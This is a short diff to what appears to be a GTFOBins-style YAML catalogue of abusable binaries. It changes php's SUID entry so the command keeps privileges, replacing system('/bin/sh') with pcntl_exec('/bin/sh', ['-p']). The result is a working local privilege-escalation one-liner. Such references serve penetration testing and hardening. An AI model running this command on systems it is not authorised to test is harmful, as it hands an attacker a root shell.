@@ -41,7 +41,7 @@ functions:
   suid:
     - code: |
         CMD="/bin/sh"
-        ./php -r "system('$CMD');"
+        ./php -r "pcntl_exec('/bin/sh', ['-p']);"
   sudo:
     - code: |
         CMD="/bin/sh"
